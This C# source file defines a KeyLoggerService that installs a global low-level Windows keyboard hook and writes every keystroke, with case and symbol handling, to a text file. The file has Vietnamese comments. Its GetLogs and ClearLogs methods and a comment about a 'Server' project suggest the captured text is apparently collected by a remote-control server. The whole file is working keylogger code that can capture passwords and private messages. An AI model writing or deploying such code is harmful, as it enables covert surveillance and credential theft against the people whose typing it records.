using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Threading;

namespace WebSocketTest // Đổi namespace cho trùng với project Server
{
    public static class KeyLoggerService
    {
        private static string logPath = "fileKeyLog.txt";
        private static IntPtr _hookID = IntPtr.Zero;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static bool _isRunning = false;
        private static Thread? _hookThread = null;
        private static object _lockObj = new object(); // Lock để thread-safe

        // Các hàm API của Windows
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        // --- HÀM ĐIỀU KHIỂN ---

        public static void Start()
        {
            lock (_lockObj)
            {
                if (_isRunning) return; // Đang chạy rồi thì thôi

                // Chạy hook trên một luồng riêng biệt để không làm đơ Server
                _hookThread = new Thread(() =>
                {
                    try
                    {
                        _hookID = SetHook(_proc);
                        _isRunning = true;
                        Application.Run(); // Vòng lặp giữ hook sống
                    }
                    catch { }
                    finally { _isRunning = false; }
                });
                _hookThread.SetApartmentState(ApartmentState.STA);
                _hookThread.IsBackground = true;
                _hookThread.Start();
            }
        }

        public static void Stop()
        {
            lock (_lockObj)
            {
                if (_isRunning && _hookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookID);
                    _hookID = IntPtr.Zero;
                    _isRunning = false;
                    // Thread sẽ tự exit khi không còn events từ keyboard
                    // Không call Application.Exit() vì nó ảnh hưởng toàn server
                }
            }
        }

        public static string GetLogs()
        {
            if (File.Exists(logPath))
            {
                try 
                {
                    // Đọc file log và trả về nội dung
                    return File.ReadAllText(logPath);
                }
                catch { return ""; }
            }
            return "";
        }

        public static void ClearLogs()
        {
             if (File.Exists(logPath)) File.WriteAllText(logPath, "");
        }

        // --- HÀM XỬ LÝ (GIỮ NGUYÊN LOGIC CŨ CỦA BẠN) ---

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using Process curProcess = Process.GetCurrentProcess();
            using ProcessModule? curModule = curProcess.MainModule;

            string moduleName = curModule?.ModuleName ?? string.Empty;

            IntPtr handle = GetModuleHandle(moduleName);

            if (handle == IntPtr.Zero)
            {
                // fallback: lấy handle của chính process
                handle = curProcess.Handle;
            }

            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, handle, 0);
        }


        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
                bool caps = Control.IsKeyLocked(Keys.CapsLock);

                // Ghi log thread-safe
                lock (_lockObj)
                {
                    try {
                        using (StreamWriter sw = File.AppendText(logPath))
                        {
                            string key = ((Keys)vkCode).ToString();

                            // Xử lý sơ bộ một số phím
                            switch ((Keys)vkCode)
                            {
                                case Keys.Space: sw.Write(" "); break;
                                case Keys.Return: sw.Write("\n"); break;
                                case Keys.Back: sw.Write("[Backspace]"); break;
                                case Keys.Tab: sw.Write("[Tab]"); break;
                                default:
                                    // Logic xử lý chữ hoa/thường
                                    if (key.Length == 1) // Ký tự A-Z, 0-9
                                    {
                                        bool isUpper = shift ^ caps; // XOR
                                        sw.Write(isUpper ? key.ToUpper() : key.ToLower());
                                    }
                                    else
                                    {
                                        switch (key)
                                        {
                                            case "OemPeriod": sw.Write("."); break;
                                            case "Oemcomma": sw.Write(","); break;
                                            case "OemMinus": sw.Write(shift ? "_" : "-"); break;
                                            case "OemPlus": sw.Write(shift ? "+" : "="); break;
                                            case "OemSemicolon": sw.Write(shift ? ":" : ";"); break;
                                            case "Oem2": sw.Write(shift ? "?" : "/"); break;
                                            case "Oem3": sw.Write(shift ? "~" : "`"); break;
                                            case "Oem4": sw.Write(shift ? "{" : "["); break;
                                            case "OemPipe": sw.Write(shift ? "|" : "\\"); break;
                                            case "Oem6": sw.Write(shift ? "}" : "]"); break;
                                            case "OemQuotes": sw.Write(shift ? "\"" : "'"); break;
                                            case "D0": sw.Write(shift ? ")" : "0"); break;
                                            case "D1": sw.Write(shift ? "!" : "1"); break;
                                            case "D2": sw.Write(shift ? "@" : "2"); break;
                                            case "D3": sw.Write(shift ? "#" : "3"); break;
                                            case "D4": sw.Write(shift ? "$" : "4"); break;
                                            case "D5": sw.Write(shift ? "%" : "5"); break;
                                            case "D6": sw.Write(shift ? "^" : "6"); break;
                                            case "D7": sw.Write(shift ? "&" : "7"); break;
                                            case "D8": sw.Write(shift ? "*" : "8"); break;
                                            case "D9": sw.Write(shift ? "(" : "9"); break;
                                            case "lShiftKey": sw.Write("[Shift]"); break;
                                            case "rShiftKey": sw.Write("[Shift]"); break;
                                            case "LControlKey": sw.Write("[Ctrl]"); break;
                                            case "RControlKey": sw.Write("[Ctrl]"); break;
                                            default:
                                                // Ghi tên phím khác dưới dạng [KeyName]
                                                sw.Write($"[{key}]");
                                                break;
                                        }
                                    }
                                    break;
                            }
                        }
                    } catch { /* Bỏ qua lỗi ghi file */ }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}